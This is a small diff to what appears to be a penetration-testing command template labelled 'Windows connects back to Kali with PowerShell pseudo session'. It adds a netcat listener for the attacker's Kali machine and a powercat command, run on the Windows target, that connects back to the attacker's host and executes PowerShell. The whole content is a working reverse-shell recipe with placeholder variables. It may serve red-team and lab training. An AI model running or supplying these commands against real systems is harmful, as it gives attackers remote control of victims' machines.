@@ -1,3 +1,8 @@
 # description: Windows connects back to Kali with PowerShell pseudo session
 # stage: Kali shell: listen for reverse PowerShell
+nc -lvnp $lport
+
 # stage: Target PowerShell: connect with pseudo session
+$LHOST = "$lhost"
+$PORT = $lport
+powercat -c $LHOST -p $PORT -ep
